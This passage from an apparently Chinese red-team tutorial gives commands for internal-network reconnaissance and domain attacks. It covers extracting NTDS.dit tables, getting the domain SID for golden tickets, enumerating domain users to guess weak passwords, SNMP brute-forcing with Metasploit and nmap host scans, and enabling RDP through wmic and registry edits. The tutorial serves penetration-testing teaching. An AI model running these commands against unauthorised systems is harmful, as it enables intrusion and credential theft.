-use-vss</code></pre><h5 id="Esentutl"><a href="#Esentutl" class="headerlink" title="Esentutl"></a>Esentutl</h5><p>esentutl常用于从dit文件提取域内信息的工具，具体使用命令：</p><pre><code class="hljs css"><span class="hljs-selector-tag">esentutl</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">NTDS</span><span class="hljs-selector-class">.dit</span> <span class="hljs-selector-tag">export-table</span> <span class="hljs-selector-tag">datatable</span> &gt;<span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.txt</span></code></pre><h5 id="Ticket"><a href="#Ticket" class="headerlink" title="Ticket"></a>Ticket</h5><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://wh<span class="hljs-number">0</span>ale.github.io/<span class="hljs-number">2018</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-<span class="hljs-number">25</span>-域渗透之票据/</code></pre><h5 id="lookupsid-py"><a href="#lookupsid-py" class="headerlink" title="lookupsid.py"></a>lookupsid.py</h5><p>可查看远程目标机器或域控所有用户内容(需提供域任意用户凭证)</p><p>lookupsid在读取远程机器用户信息时，同时会输出域SID，域SID是生成黄金票据所需数据。</p><pre><code class="hljs css"><span class="hljs-selector-tag">lookupsid</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">domain</span>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:password</span><span class="hljs-keyword">@ip</span></code></pre><hr><h4 id="3-4-5、域信息收集之user2sid，sid2user"><a href="#3-4-5、域信息收集之user2sid，sid2user" class="headerlink" title="3.4.5、域信息收集之user2sid，sid2user"></a>3.4.5、域信息收集之user2sid，sid2user</h4><p>使用场景：当前内网环境有域环境，使用nbtscan或者nltest获取到域控的IP，但是没有域用户的账号密码</p><p>作用：使用 sid2user 和 user2sid 枚举猜测出域用户名，并通过弱口令获取域用户的权限<br>下载地址：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//g</span>reatagain.dbappsecurity.com.cn<span class="hljs-regexp">/#/</span>publicarea<span class="hljs-regexp">/tooldisk?path=412/</span><span class="hljs-number">2430</span></code></pre><p>目前无法访问！</p><p><strong>使用</strong></p><pre><code class="hljs armasm"><span class="hljs-symbol">user2sid.exe</span> \\域控<span class="hljs-built_in">IP</span> 域用户名</code></pre><p>域里面域管默认为administrator用户，且sid为500</p><p>那么先通过administrator域管获取域用户的sid</p><pre><code class="hljs css"><span class="hljs-selector-tag">user2sid</span><span class="hljs-selector-class">.exe</span> \\192.168<span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">administrator</span></code></pre><p>得到域用户的sd为S-1-5-21-675002476-827761xxxx…<br>总结文章：</p><pre><code class="hljs awk">freebuf.com<span class="hljs-regexp">/sectool/</span><span class="hljs-number">175208</span>.html</code></pre><hr><h2 id="4、工作组环境信息搜集"><a href="#4、工作组环境信息搜集" class="headerlink" title="4、工作组环境信息搜集"></a>4、工作组环境信息搜集</h2><h3 id="4-1-基于MSF发现内网存活主机"><a href="#4-1-基于MSF发现内网存活主机" class="headerlink" title="4.1 基于MSF发现内网存活主机"></a>4.1 基于MSF发现内网存活主机</h3><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep    <span class="hljs-comment">#基于arp协议发现内网存活主机，这不能通过代理使用</span>auxiliary<span class="hljs-regexp">/scanner/</span>portscan/ack           <span class="hljs-comment">#基于tcp的ack回复进行端口扫描，默认扫描1-10000端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#基于tcp进行端口扫描，默认扫描1-10000端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#基于netbios协议发现内网存活主机</span>auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version        <span class="hljs-comment">#发现内网ftp服务，基于默认21端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version        <span class="hljs-comment">#发现内网ssh服务，基于默认22端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version  <span class="hljs-comment">#发现内网telnet服务，基于默认23端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp            <span class="hljs-comment">#发现dns服务，基于默认53端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version      <span class="hljs-comment">#发现内网http服务，基于默认80端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>http/title             <span class="hljs-comment">#探测内网http服务的标题</span>auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version        <span class="hljs-comment">#发现内网smb服务，基于默认的445端口   </span>use auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump  <span class="hljs-comment">#发现内网SQLServer服务,基于默认的1433端口</span>use auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump  <span class="hljs-comment">#发现内网oracle服务,基于默认的1521端口 </span>auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version    <span class="hljs-comment">#发现内网mysql服务，基于默认3306端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner        <span class="hljs-comment">#发现内网RDP服务，基于默认3389端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server     <span class="hljs-comment">#发现内网Redis服务，基于默认6379端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version        <span class="hljs-comment">#探测内网的db2服务，基于默认的50000端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#探测内网主机的netbios名字</span></code></pre><p>感谢Micro8大佬！！！</p><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">21</span>-<span class="hljs-number">30</span>/<span class="hljs-number">28</span>-ji-yu-msf-fa-xian-nei-wang-cun-huo-zhu-ji-di-liu-ji</code></pre><hr><h3 id="4-2、基于sqlDataSourceEnumerator发现内网存活主机"><a href="#4-2、基于sqlDataSourceEnumerator发现内网存活主机" class="headerlink" title="4.2、基于sqlDataSourceEnumerator发现内网存活主机"></a>4.2、基于sqlDataSourceEnumerator发现内网存活主机</h3><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">41</span>-<span class="hljs-number">50</span>/<span class="hljs-number">50</span>-ji-yu-sqldatasourceenumerator-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><p>感谢大佬！！Micro8</p><hr><h3 id="4-3、基于ICMP发现内网存活主机"><a href="#4-3、基于ICMP发现内网存活主机" class="headerlink" title="4.3、基于ICMP发现内网存活主机"></a>4.3、基于ICMP发现内网存活主机</h3><p><strong>ICMP简介：</strong></p><p>它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><p><strong>nmap扫描：</strong></p><pre><code class="hljs bash">$ sudo nmap -sP -PI 192.168.1.0/24 -T4</code></pre><pre><code class="hljs bash">$ nmap -sn -PE -T4 192.168.1.0/24</code></pre><p><strong>CMD下扫描：</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %%P in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) do @ping -w <span class="hljs-number">10</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.%%P | findstr TTL</code></pre><p><strong>powershell扫描：</strong></p><pre><code class="hljs 1c">powershell.exe ‐exec bypass ‐Command <span class="hljs-string">&quot;Import‐Module ./Invoke‐TSPingSweep.ps1</span>; Invoke‐TSPingSweep ‐StartAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> ‐EndAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">1.254</span> ‐ResolveHost ‐ScanPort ‐Port <span class="hljs-number">445</span>,<span class="hljs-number">135</span><span class="hljs-string">&quot;</span></code></pre><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\&gt;tcping.exe ‐n <span class="hljs-number">1</span> <span class="hljs-number">192.168.1.0</span> <span class="hljs-number">80</span></code></pre><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">21</span>-<span class="hljs-number">30</span>/<span class="hljs-number">21</span>-ji-yu-icmp-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><hr><h3 id="4-4、基于UDP发现内网存活主机"><a href="#4-4、基于UDP发现内网存活主机" class="headerlink" title="4.4、基于UDP发现内网存活主机"></a>4.4、基于UDP发现内网存活主机</h3><p><strong>UDP简介：</strong></p><p>UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p><p><strong>UDP显著特性：</strong></p><p>1）UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次。</p><p>2）UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任何（协议上的）记录边界。</p><p>3）UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报</p><p>4）UDP 支持多播和广播。</p><p><strong>1、nmap扫描</strong></p><pre><code class="hljs gams"><span class="hljs-symbol">$</span> nmap -sU -T5 -sV --<span class="hljs-built_in">max</span>-retries <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> -p <span class="hljs-number">500</span></code></pre><p><strong>2、msf扫描</strong></p><pre><code class="hljs awk">msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probemsf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep</code></pre><p><strong>3、unicornscan扫描</strong></p><p>linux下使用推荐</p><pre><code class="hljs dns">$ unicornscan -mU <span class="hljs-number">192.168.1.100</span></code></pre><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.mcafee.com<span class="hljs-regexp">/ca/</span>downloads<span class="hljs-regexp">/free-tools/</span>scanline.aspx</code></pre><p>蓝奏地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.lanzous.com/i32zncf</code></pre><p>win下使用推荐。管理员执行</p><p>附录：<br>在线基于Nmap的udp扫描：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>pentest-tools.com<span class="hljs-regexp">/network-vulnerability-scanning/u</span>dp-port-scanner-online-nmap</code></pre><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">11</span>-<span class="hljs-number">20</span>/<span class="hljs-number">12</span>-ji-yu-udp-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><hr><h3 id="4-5、基于ARP发现内网存活主机"><a href="#4-5、基于ARP发现内网存活主机" class="headerlink" title="4.5、基于ARP发现内网存活主机"></a>4.5、基于ARP发现内网存活主机</h3><p><strong>ARP简介：</strong></p><p>ARP，通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p><p><strong>1、nmap扫描</strong></p><pre><code class="hljs vim">$ <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> -PR <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">24</span></code></pre><p><strong>2、msf扫描</strong></p><pre><code class="hljs pgsql">msf &gt; use auxiliary/scanner/discovery/arp_sweepmsf auxiliary(arp_sweep) &gt; <span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span>Module <span class="hljs-keyword">options</span> (auxiliary/scanner/discovery/arp_sweep):<span class="hljs-type">Name</span> <span class="hljs-keyword">Current</span> Setting Required Description<span class="hljs-comment">---- --------------- -------- -----------</span>INTERFACE <span class="hljs-keyword">no</span> The <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the interfaceRHOSTS yes The target address range <span class="hljs-keyword">or</span> <span class="hljs-type">CIDR</span> identifierSHOST <span class="hljs-keyword">no</span> Source IP AddressSMAC <span class="hljs-keyword">no</span> Source MAC AddressTHREADS <span class="hljs-number">1</span> yes The number <span class="hljs-keyword">of</span> concurrent threadsTIMEOUT <span class="hljs-number">5</span> yes The number <span class="hljs-keyword">of</span> seconds <span class="hljs-keyword">to</span> wait <span class="hljs-keyword">for</span> <span class="hljs-built_in">new</span> datamsf auxiliary(arp_sweep) &gt; <span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>RHOSTS =&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>msf auxiliary(arp_sweep) &gt; <span class="hljs-keyword">set</span> THREADS <span class="hljs-number">10</span></code></pre><p><strong>3、netdiscover</strong></p><pre><code class="hljs dns">$ netdiscover -r <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> -i wlan0</code></pre><p><strong>4、arp-scan（linux）</strong><br>(推荐)速度与快捷 项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>linux.die.net<span class="hljs-regexp">/man/</span><span class="hljs-number">1</span>/arp-scan</code></pre><p>arp-scan没有内置kali，需要下载安装</p><pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> install arp-<span class="hljs-built_in">scan</span></code></pre><p><strong>5、Powershell</strong></p><pre><code class="hljs avrasm"><span class="hljs-symbol">c:</span>\tmp&gt;powershell.exe -exec bypass -Command <span class="hljs-string">&quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;</span></code></pre><p><strong>6、arp scannet</strong><br>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sourceforge.net<span class="hljs-regexp">/projects/</span>arpscannet<span class="hljs-regexp">/files/</span>arpscannet<span class="hljs-regexp">/arpscannet 0.4/</span></code></pre><p><strong>7、arp-scan（windows）</strong></p><p>(推荐)速度与快捷</p><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>-scan.exe -t <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span></code></pre><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/QbsuranAlang/</span>arp-scan-windows-<span class="hljs-regexp">/tree/m</span>aster/arp-scan （非官方）</code></pre><p><strong>8、arp-ping.exe</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>-ping.exe <span class="hljs-number">192.168.1.100</span></code></pre><p><strong>9、其他</strong></p><p>如cain的arp发现，一些开源py，pl脚本等，不一一介绍。</p><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">11</span>-<span class="hljs-number">20</span>/<span class="hljs-number">13</span>-ji-yu-arp-fa-xian-nei-wang-cun-huo-zhu-ji#<span class="hljs-number">5</span>-powershell</code></pre><hr><h3 id="4-6、基于snmp发现内网存活主机"><a href="#4-6、基于snmp发现内网存活主机" class="headerlink" title="4.6、基于snmp发现内网存活主机"></a>4.6、基于snmp发现内网存活主机</h3><p><strong>SNMP简介：</strong></p><p>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。</p><p><strong>nmap扫描：</strong></p><pre><code class="hljs ada">$ nmap -sU <span class="hljs-comment">--script snmp-brute 192.168.1.0/24 -T4</span></code></pre><p><strong>msf扫描：</strong></p><pre><code class="hljs awk">msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/snmp_enum</code></pre><p><strong>项目地址：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.mcafee.com<span class="hljs-regexp">/us/</span>downloads<span class="hljs-regexp">/free-tools/</span>snscan.aspx</code></pre><p>依然是一块macafee出品的攻击</p><p><strong>NetCrunch：</strong></p><p><strong>项目地址：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.adremsoft.com<span class="hljs-regexp">/demo/</span></code></pre><p>内网安全审计工具，包含了DNS审计，ping扫描，端口，网络服务等<br><strong>snmp for pl扫描：</strong></p><p><strong>项目地址：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/dheiland-r7/</span>snmp</code></pre><p><strong>附录：</strong></p><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/aix_version use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_enumuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp/arris_dg950use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/snmp_enum_hp_laserjetuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/brocade_enumhash use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_enumshares use auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/cambium_snmp_loot use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_enumusersuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/cisco_config_tftp use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_loginuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/cisco_upload_file use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_setuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp/netopia_enumuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp/ubee_ddw3611 use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/sbg6580_enumuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp/xerox_workcentre_enumusers</code></pre><p><strong>其他内网安全审计工具（snmp）：</strong><br>项目地址：<a href="https://www.solarwinds.com/topics/snmp-scanner">https://www.solarwinds.com/topics/snmp-scanner</a><br>项目地址：<a href="https://www.netscantools.com/nstpro_snmp.html">https://www.netscantools.com/nstpro_snmp.html</a></p><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">11</span>-<span class="hljs-number">20</span>/<span class="hljs-number">20</span>-ji-yu-snmp-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><hr><h3 id="4-7、基于netbios发现內网存活主机"><a href="#4-7、基于netbios发现內网存活主机" class="headerlink" title="4.7、基于netbios发现內网存活主机"></a>4.7、基于netbios发现內网存活主机</h3><p><strong>netbios简介：</strong></p><p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。</p><p>系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享</p><p><strong>nmap扫描：</strong></p><pre><code class="hljs ada">$ nmap -sU <span class="hljs-comment">--script nbstat.nse -p137 192.168.1.0/24 -T4</span></code></pre><p><strong>msf扫描：</strong></p><pre><code class="hljs awk">msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname</code></pre><p><strong>nbtscan扫描：</strong></p><p>项目地址：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.unixwiz.net<span class="hljs-regexp">/tools/</span>nbtscan.html</code></pre><p><strong>Windows:</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\&gt;nbtscan-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">35</span>.exe -m <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span></code></pre><p><strong>Linux：（推荐）</strong></p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>tar -zxvf ./nbtscan-source<span class="hljs-number">-1.0</span>.<span class="hljs-number">35</span>.tgz（<span class="hljs-number">1.5</span>.<span class="hljs-number">1</span>版本在附录）<span class="hljs-variable">$ </span>make <span class="hljs-variable">$ </span>nbtscan -r <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span></code></pre><pre><code class="hljs dns">$ nbtscan -v -s: <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span></code></pre><p><strong>NetBScanner：</strong></p><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.nirsoft.net<span class="hljs-regexp">/utils/</span>netbios_scanner.html</code></pre><p>附录：<br><strong>nbtscan：</strong></p><pre><code class="hljs sql">NBTscan version 1.5.1. Copyright (C) 1999-2003 Alla Bezroutchko. This is a free software and it comes <span class="hljs-keyword">with</span> absolutely <span class="hljs-keyword">no</span> warranty. You can <span class="hljs-keyword">use</span>,<span class="hljs-keyword">distribute</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">modify</span> it <span class="hljs-keyword">under</span> terms <span class="hljs-keyword">of</span> GNU GPL.<span class="hljs-keyword">Usage</span>:nbtscan [-v] [-d] [-e] [-l] [-t <span class="hljs-keyword">timeout</span>] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;)    -v verbose output. Print <span class="hljs-keyword">all</span> <span class="hljs-keyword">names</span> receivedfrom <span class="hljs-keyword">each</span> host    -d dump packets. Print whole packet contents.    -e <span class="hljs-keyword">Format</span> <span class="hljs-keyword">output</span> <span class="hljs-keyword">in</span> /etc/<span class="hljs-keyword">hosts</span> format.    -l <span class="hljs-keyword">Format</span> <span class="hljs-keyword">output</span> <span class="hljs-keyword">in</span> lmhosts format.Cannot be used <span class="hljs-keyword">with</span> -v, -s <span class="hljs-keyword">or</span> -h options.    -t <span class="hljs-keyword">timeout</span> <span class="hljs-keyword">wait</span> <span class="hljs-keyword">timeout</span> milliseconds <span class="hljs-keyword">for</span> response.Default <span class="hljs-number">1000.</span>    -b bandwidth <span class="hljs-keyword">Output</span> throttling. Slow down <span class="hljs-keyword">output</span> so that it uses <span class="hljs-keyword">no</span> more that bandwidth bps. Useful <span class="hljs-keyword">on</span> slow links, so that ougoing queries don<span class="hljs-string">&#x27;t get dropped.</span><span class="hljs-string">    -r use local port 137 for scans. Win95 boxes respond to this only.You need to be root to use this option on Unix.</span><span class="hljs-string">    -q Suppress banners and error messages,</span><span class="hljs-string">    -s separator Script-friendly output. Don&#x27;</span>t print <span class="hljs-keyword">column</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">record</span> headers, separate <span class="hljs-keyword">fields</span> <span class="hljs-keyword">with</span> separator.    -h Print human-readable <span class="hljs-keyword">names</span> <span class="hljs-keyword">for</span> services. Can <span class="hljs-keyword">only</span> be used <span class="hljs-keyword">with</span> -v option.    -m retransmits <span class="hljs-built_in">Number</span> <span class="hljs-keyword">of</span> retransmits. <span class="hljs-keyword">Default</span> <span class="hljs-number">0.</span>    -f filename Take IP addresses <span class="hljs-keyword">to</span> <span class="hljs-keyword">scan</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">file</span> filename.    -f - makes nbtscan take IP addresses <span class="hljs-keyword">from</span> stdin.    &lt;scan_range&gt; what <span class="hljs-keyword">to</span> scan. Can either be single IP         <span class="hljs-keyword">like</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-keyword">or</span>        <span class="hljs-keyword">range</span> <span class="hljs-keyword">of</span> addresses <span class="hljs-keyword">in</span> one <span class="hljs-keyword">of</span> two forms:        xxx.xxx.xxx.xxx/xx <span class="hljs-keyword">or</span> xxx.xxx.xxx.xxx-xxx.Examples:    nbtscan -r <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>        Scans the whole C-<span class="hljs-keyword">class</span> network.    nbtscan <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span><span class="hljs-number">-137</span>        Scans a <span class="hljs-keyword">range</span> <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span> <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.137</span>    nbtscan -v -s : <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>        Scans C-<span class="hljs-keyword">class</span> network. Prints results <span class="hljs-keyword">in</span> script-friendly        <span class="hljs-keyword">format</span> <span class="hljs-keyword">using</span> colon <span class="hljs-keyword">as</span> <span class="hljs-keyword">field</span> separator.          Produces <span class="hljs-keyword">output</span> <span class="hljs-keyword">like</span> that:        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:NT_SERVER:<span class="hljs-number">00</span>U        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:MY_DOMAIN:<span class="hljs-number">00</span>G        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:ADMINISTRATOR:<span class="hljs-number">03</span>U        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>:OTHER_BOX:<span class="hljs-number">00</span>U        ...    nbtscan -f iplist        Scans IP addresses specified <span class="hljs-keyword">in</span> <span class="hljs-keyword">file</span> iplist.</code></pre><p><strong>NBTscan version 1.5.1:</strong></p><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/scallywag/</span>nbtscan</code></pre><hr><h3 id="4-8、内网信息收集之内网代理"><a href="#4-8、内网信息收集之内网代理" class="headerlink" title="4.8、内网信息收集之内网代理"></a>4.8、内网信息收集之内网代理</h3><p><strong>查询代理配置情况</strong></p><pre><code class="hljs taggerscript">reg query &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings&quot;</code></pre><p><strong>查询并开启远程连接服务</strong><br>查看远程连接端口</p><pre><code class="hljs taggerscript">Reg query &quot;hkey_local_machine<span class="hljs-symbol">\s</span>ystem<span class="hljs-symbol">\c</span>urrentcontrolset<span class="hljs-symbol">\c</span>ontrol<span class="hljs-symbol">\t</span>erminal server<span class="hljs-symbol">\w</span>instations<span class="hljs-symbol">\R</span>DP-Tcp&quot; /v portnumber</code></pre><p>在Windows Server 2003中开启3389端口</p><pre><code class="hljs pgsql">wmic <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (__CLASS !=&quot;&quot;)  <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span></code></pre><p>在Windows Server 2008和Windows Server 2012中开启3389端口</p><pre><code class="hljs taggerscript">wmic /namespace:<span class="hljs-symbol">\\</span>root<span class="hljs-symbol">\c</span>imv2<span class="hljs-symbol">\t</span>erminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:<span class="hljs-symbol">\\</span>root<span class="hljs-symbol">\c</span>imv2<span class="hljs-symbol">\t</span>erminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1reg add &quot;HKLM<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>URRENT<span class="hljs-symbol">\C</span>ONTROLSET<span class="hljs-symbol">\C</span>ONTROL<span class="hljs-symbol">\T</span>ERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队攻防</tag>
      
      <tag>渗透攻击红队百科全书</tag>
      
    </tags>
    
  </entry>
  
  
  
